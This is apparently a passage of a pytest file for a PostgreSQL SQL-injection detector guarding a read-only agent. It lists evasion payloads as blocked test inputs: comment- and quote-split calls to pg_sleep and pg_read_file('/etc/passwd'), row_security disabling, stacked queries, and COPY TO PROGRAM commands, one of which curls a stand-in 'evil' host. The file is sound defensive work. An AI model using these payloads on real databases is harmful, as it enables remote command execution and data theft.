        normalized = ' '.join(strip_quoted_identifiers(raw).split())
        assert normalized == ' '.join(expected.split())

    def test_no_space_quoted_call_is_detected(self):
        """End-to-end: SELECT"pg_sleep"(1) (no space) must be blocked.

        A double quote ends the preceding token in PostgreSQL, so this is
        a valid call. The space-padding in the helper preserves the token
        boundary so the dangerous-function pattern still fires.
        """
        assert check_sql_injection_risk('SELECT"pg_sleep"(1)')
        assert check_sql_injection_risk('SELECT"pg_read_file"(\'/etc/passwd\')')
        assert check_sql_injection_risk('SET"row_security"=off')


class TestCommentInjectionBypass:
    """Inline comments must not let keywords/functions evade detection.

    Regression. PostgreSQL treats /* */ block comments (which
    nest) and -- line comments as whitespace, so INTO/**/OUTFILE,
    pg_sleep/**/(1), SET/**/row_security and IMPORT/**/FOREIGN/**/SCHEMA
    all execute normally while slipping past regexes that expect literal
    whitespace between tokens. strip_sql_comments() folds comments to a
    space before matching so the comment and non-comment spellings are
    detected identically.
    """

    @pytest.mark.parametrize(
        'sql,expected_fragment',
        [
            ('SELECT pg_sleep/**/(3)', 'pg_sleep'),
            ("SELECT pg_read_file/**/('/etc/passwd')", 'pg_read_file'),
            ("SELECT dblink_connect/**/('host=x')", 'dblink_connect'),
            ('SET/**/row_security = off', 'row_security'),
            ("SELECT set_config/**/('row_security','off',false)", 'row_security'),
        ],
    )
    def test_comment_split_blocked_in_both_modes(self, sql, expected_fragment):
        """A comment wedged before the paren / between SET and the GUC is caught."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert expected_fragment in issues[0]['message']

    @pytest.mark.parametrize(
        'sql',
        [
            "SELECT * INTO/**/OUTFILE '/tmp/x' FROM t",
            "SELECT load_file/**/('/etc/passwd')",
            'SELECT sleep/**/(5)',
        ],
    )
    def test_comment_split_suspicious_pattern_flagged(self, sql):
        """Comment-split MySQL-ism file primitives still trip a suspicious pattern."""
        assert check_sql_injection_risk(sql)

    def test_comment_split_multiword_keyword_blocked_in_readonly(self):
        """IMPORT/**/FOREIGN/**/SCHEMA must still register as a mutating keyword.

        Without comment normalization the multi-word keyword splits and
        IMPORT alone is not in the set, so the whole statement slips past
        the read-only gate.
        """
        assert 'IMPORT FOREIGN SCHEMA' in detect_mutating_keywords(
            'IMPORT/**/FOREIGN/**/SCHEMA public FROM SERVER s INTO local'
        )

    def test_line_comment_split_blocked(self):
        """A -- line comment (newline-terminated) also normalizes to whitespace."""
        sql = 'SELECT pg_sleep --x\n(3)'
        assert check_sql_injection_risk(sql)

    def test_nested_block_comment_handled(self):
        """Nested /* /* */ */ comments (PostgreSQL allows nesting) are stripped."""
        assert check_sql_injection_risk('SELECT pg_sleep/* /* nested */ */(3)')

    def test_comment_marker_inside_string_is_not_a_comment(self):
        """A /* or -- inside a single-quoted literal must be preserved.

        Otherwise stripping it could corrupt the literal and change which
        patterns match. Here the literal is benign and must be allowed.
        """
        sql = "SELECT id FROM t WHERE note = 'a /* b */ c'"
        assert check_sql_injection_risk(sql) == []
        assert detect_mutating_keywords(sql) == []

    def test_comment_injection_heuristic_still_fires_on_raw(self):
        """The '...-- comment-injection heuristic must survive comment-stripping.

        It is evaluated against the raw SQL as well, so a trailing -- after
        a string is still flagged even though the normalizer would remove it.
        """
        assert check_sql_injection_risk("SELECT * FROM t WHERE name = '' OR ''='' --")

    @pytest.mark.parametrize(
        'sql',
        [
            # Scary keywords / a semicolon that live only inside a comment
            # must NOT be flagged: the normalizer folds the comment away and
            # the suspicious patterns run on the normalized text.
            'SELECT 1 /* DROP this idea */ FROM t',
            'SELECT 1 /* TODO: grant access later */ FROM t',
            'SELECT 1 -- truncate the log file someday\n',
            'SELECT 1 -- ; SELECT 2\n',
            'SELECT 1 /* union of ideas */ FROM t',
        ],
    )
    def test_keyword_inside_comment_not_flagged(self, sql):
        """Keywords appearing only inside comments are not false-positives."""
        assert check_sql_injection_risk(sql) == []
        assert detect_mutating_keywords(sql) == []


class TestCopyProgramRce:
    """COPY ... TO/FROM PROGRAM is server-side RCE.

    COPY is gated in read-only mode as a mutating keyword, but the PROGRAM
    form runs a shell command on the database host and must be rejected
    even when writes are enabled. The mode-independent check lives in
    check_sql_injection_risk.
    """

    @pytest.mark.parametrize(
        'sql',
        [
            "COPY t TO PROGRAM 'curl http://evil/$(whoami)'",
            "COPY t FROM PROGRAM 'whoami'",
            "COPY (SELECT 1) TO PROGRAM 'id'",
            # Comment-split and case variations.
            "COPY t TO/**/PROGRAM 'id'",
            "copy t to program 'id'",
            "/* lead */ COPY t TO PROGRAM 'id'",
        ],
    )
    def test_copy_program_rejected_both_modes(self, sql):
        """Each COPY PROGRAM form is rejected with the RCE message."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert 'PROGRAM' in issues[0]['message']
        assert issues[0]['severity'] == 'high'

    def test_plain_copy_to_file_not_rce_flagged(self):
        """COPY ... TO '/file' (no PROGRAM) is not flagged by the RCE check.

        It is still a mutating keyword (blocked in read-only mode), but the
        always-on RCE check must not fire on it.
        """
        issues = check_sql_injection_risk("COPY t TO '/tmp/export.csv'")
        for issue in issues:
            assert 'PROGRAM' not in issue['message']
        # But it is still caught by the read-only mutating-keyword gate.
        assert 'COPY' in detect_mutating_keywords("COPY t TO '/tmp/export.csv'")

    def test_copy_program_text_in_string_literal_not_flagged(self):
        """The literal text 'COPY ... TO PROGRAM' inside a string value is fine.

        The pattern is anchored at the statement start, so a SELECT whose
        column value happens to contain that text is not over-blocked.
        """
        issues = check_sql_injection_risk(
            "SELECT id FROM cmds WHERE body = 'COPY x TO PROGRAM cmd'"
        )
        for issue in issues:
            assert 'PROGRAM' not in issue['message']

    @pytest.mark.parametrize(
        'sql',
        [
            # COPY PROGRAM as a SECOND statement. COPY_PROGRAM_PATTERN is
            # anchored at the statement start so it does not match here, but
            # any multi-statement query is rejected by the stacked-query
            # suspicious pattern regardless of the whitespace after the ';'
            # (the pattern's \\s* consumes a newline before the (?=\\S) check).
            "SELECT 1;\nCOPY t TO PROGRAM 'id'",
            "SELECT 1;\n\n  COPY t FROM PROGRAM 'whoami'",
            "SELECT 1; COPY t TO PROGRAM 'id'",
            "SELECT 1 ;\nCOPY t TO PROGRAM 'id'",
            "SELECT 1;/* c */\nCOPY t TO PROGRAM 'id'",
        ],
    )
    def test_copy_program_as_second_statement_is_blocked(self, sql):
        """A newline/space-separated stacked COPY PROGRAM must not slip through.

        Regression guard: the protection here comes from the stacked-query
        pattern (multi-statement queries are rejected outright), not from
        COPY_PROGRAM_PATTERN. If the stacked-query pattern is ever changed,
        these assertions catch a reopened bypass.
        """
        assert check_sql_injection_risk(sql)
        # Also blocked in read-only mode via the COPY mutating keyword.
        assert 'COPY' in detect_mutating_keywords(sql)


class TestStripSqlComments:
    """Unit coverage for the comment-stripping normalizer."""

    @pytest.mark.parametrize(
        'raw,expected',
        [
            ('INTO/**/OUTFILE', 'INTO OUTFILE'),
            ('a/* x */b', 'a b'),
            ('SELECT 1 -- tail\nFROM t', 'SELECT 1  FROM t'),
            ('SELECT 1 -- tail at eof', 'SELECT 1  '),
            # Nested block comment.
            ('a/* /* n */ */b', 'a b'),
            # Comment marker inside a single-quoted string is preserved.
            ("'a -- b'", "'a -- b'"),
            ("'a /* b */ c'", "'a /* b */ c'"),
            # Dollar-quoted body is preserved verbatim.
            ('$$ a -- b /* c */ $$', '$$ a -- b /* c */ $$'),
            # Escaped "" inside a double-quoted identifier: the identifier
            # a"b is preserved (both quotes kept) and a trailing comment is
            # still stripped. Exercises the "" escape branch.
            ('"a""b"/* c */d', '"a""b" d'),
            # A comment marker inside a double-quoted identifier is data,
            # not a comment, and must be preserved.
            ('"a/*b"', '"a/*b"'),
            # Unterminated dollar-quoted string: copied verbatim to the end
            # (the closing tag is never found). Exercises the end == -1 path.
            ('$$ unterminated body', '$$ unterminated body'),
            ('$tag$ also unterminated', '$tag$ also unterminated'),
            # No comments — unchanged.
            ('SELECT 1', 'SELECT 1'),
        ],
    )
    def test_strip(self, raw, expected):
        """Comments fold to a single space; literals are left intact."""
        assert ' '.join(strip_sql_comments(raw).split()) == ' '.join(expected.split())

    def test_normalize_combines_comment_and_quote_handling(self):
        """normalize_for_detection folds comments then unwraps quoted idents."""
        normalized = normalize_for_detection('SELECT "pg_sleep"/**/(1)')
        assert 'pg_sleep' in normalized
        assert '"' not in normalized
        assert '/*' not in normalized


class TestLegitimateReadQueriesAllowed:
    """Positive-path coverage: realistic read queries must NOT be blocked.

    The blocking tests above prove dangerous input is rejected. These
    tests prove the detector doesn't over-block — a read-only agent
    issuing ordinary SELECTs (joins, CTEs, window functions, aggregates,
    catalog introspection) must pass both the mutating-keyword check
    (readonly path) and check_sql_injection_risk (always-on path).

    A query is considered "allowed" only if BOTH checks pass:
      - detect_mutating_keywords(sql) == []   (not blocked in readonly mode)
      - check_sql_injection_risk(sql) == []   (not blocked in any mode)
    """

    ALLOWED_QUERIES = [
        # Basic filtered select
        'SELECT id, name FROM users WHERE id = 1',
        # Aggregate
        'SELECT count(*) FROM orders',
        # Join
        'SELECT u.name, o.total FROM users u JOIN orders o ON o.user_id = u.id',
        # GROUP BY / HAVING / ORDER BY / LIMIT
        (
            'SELECT dept, avg(salary) FROM emp GROUP BY dept '
            'HAVING avg(salary) > 1000 ORDER BY dept LIMIT 10'
        ),
        # CTE
        (
            "WITH recent AS (SELECT * FROM events WHERE ts > now() - interval '1 day') "
            'SELECT * FROM recent'
        ),
        # Window function
        'SELECT row_number() OVER (PARTITION BY dept ORDER BY salary DESC) FROM emp',
        # Built-in informational function
        'SELECT version()',
        # Constant select
        'SELECT 1',
        # Escaped single quote in a string literal (not comment injection)
        "SELECT id FROM t WHERE name = 'O''Brien'",
        # Tables whose names embed a mutating keyword as a substring
        'SELECT * FROM created_users',
        'SELECT * FROM updates',
        'SELECT * FROM deleted_items',
        # Reading the settings catalog is a legitimate read (vs SET which mutates)
        'SELECT setting FROM pg_settings',
        "SELECT current_setting('search_path')",
        # Column name that is a prefix of a dangerous function (no call)
        'SELECT loadavg FROM metrics',
        # Plain OR with column refs (not an OR-tautology)
        'SELECT id FROM t WHERE a = 1 OR b = 2',
        # Single trailing semicolon is tolerated (not a stacked query)
        'SELECT id, name FROM users WHERE id = 1;',
        # The real introspection query get_table_schema issues
        (
            'SELECT a.attname FROM pg_attribute a '
            "WHERE a.attrelid = to_regclass('t') AND a.attnum > 0 ORDER BY a.attnum"
        ),
        # information_schema introspection
        "SELECT * FROM information_schema.columns WHERE table_name = 'users'",
        # coalesce / scalar functions
        "SELECT coalesce(name, 'n/a') FROM users",
        # EXTRACT
        'SELECT EXTRACT(YEAR FROM created_at) FROM orders',
        # Plain EXPLAIN (without ANALYZE) is a read-only planner inspection
        'EXPLAIN SELECT * FROM t',
        # Benign comments must not cause over-blocking.
        'SELECT 1 /* inline note */ FROM t',
        'SELECT id FROM users -- trailing note\nWHERE id = 1',
    ]

    @pytest.mark.parametrize('sql', ALLOWED_QUERIES)
    def test_not_blocked_in_readonly_mode(self, sql):
        """No mutating keyword is detected, so the readonly path allows it."""
        matches = detect_mutating_keywords(sql)
        assert matches == [], f'unexpected mutating-keyword block for {sql!r}: {matches}'

    @pytest.mark.parametrize('sql', ALLOWED_QUERIES)
    def test_not_blocked_by_injection_check(self, sql):
        """check_sql_injection_risk (always-on) raises no issue."""
        issues = check_sql_injection_risk(sql)
        assert issues == [], f'unexpected injection-risk block for {sql!r}: {issues}'


class TestKnownFalsePositives:
    """Document detector limitations as explicit, intentional tests.

    These inputs are benign but get blocked by the regex-based detector.
    They are recorded here so the behaviour is intentional and visible:
    if a future change accidentally *fixes* one, the maintainer sees the
    test fail and can decide whether the fix is desired. The detector is
    documented as best-effort defence-in-depth, so over-blocking these
    edge cases is an accepted trade-off.
    """

    def test_explain_analyze_blocked_in_readonly(self):
        """EXPLAIN ANALYZE trips the ANALYZE keyword in readonly mode.

        ANALYZE-the-statistics-command and ANALYZE-the-EXPLAIN-option
        share a keyword. Plain EXPLAIN (tested in the allow list) is
        fine; EXPLAIN ANALYZE is over-blocked in readonly mode.
        """
        assert 'ANALYZE' in detect_mutating_keywords('EXPLAIN ANALYZE SELECT * FROM t')

    def test_double_dash_inside_string_literal_flagged(self):
        """A literal containing '--' trips the comment-injection pattern.

        The regex can't distinguish a real trailing comment from '--'
        appearing inside a quoted string. Accepted limitation.
        """
        issues = check_sql_injection_risk("SELECT * FROM t WHERE note = 'see comment -- here'")
        assert len(issues) >= 1

    def test_quoted_reserved_word_column_over_blocked_in_readonly(self):
        """A column quoted to reuse a reserved word is over-blocked in readonly.

        SELECT "update" FROM t reads a column literally named update; the
        double quotes make it an identifier, not the UPDATE command. But
        detect_mutating_keywords runs on the raw SQL and its word-boundary
        regex matches inside the quotes, so it is flagged as UPDATE and
        rejected in read-only mode. This is the accepted false positive
        discussed for the regex approach — the safe direction (over-block)
        — and would require true SQL parsing to resolve. The always-on
        injection check does NOT flag it, so a write-enabled server still
        allows it.
        """
        assert 'UPDATE' in detect_mutating_keywords('SELECT "update" FROM t')
        # The mode-independent check does not over-block it.
        assert check_sql_injection_risk('SELECT "update" FROM t') == []

    def test_mutating_keyword_inside_string_literal_over_blocked_in_readonly(self):
        """A mutating keyword appearing inside a string VALUE is over-blocked.

        detect_mutating_keywords matches keyword *words* anywhere in the
        SQL, including inside single-quoted string literals, so a benign
        read like SELECT ... WHERE note = 'how to COPY a table' is rejected
        in read-only mode. Distinguishing a keyword from string data needs
        real parsing; over-blocking is the accepted safe direction. The
        always-on injection check itself does not add a block here (the COPY
        RCE pattern is anchored at statement start).
        """
        sql = "SELECT id FROM t WHERE body = 'how to COPY a table'"
        assert 'COPY' in detect_mutating_keywords(sql)
        assert check_sql_injection_risk(sql) == []

    def test_dangerous_function_text_inside_string_literal_over_blocked(self):
        """Dangerous-function text inside a string literal trips the check.

        SELECT ... WHERE q = 'SELECT pg_sleep(1)' contains the literal text
        pg_sleep( inside a string value; the regex cannot tell it is data,
        so it is rejected in both modes. Accepted limitation — resolving it
        needs literal-aware parsing.
        """
        issues = check_sql_injection_risk("SELECT q FROM t WHERE q = 'SELECT pg_sleep(1)'")
        assert len(issues) >= 1
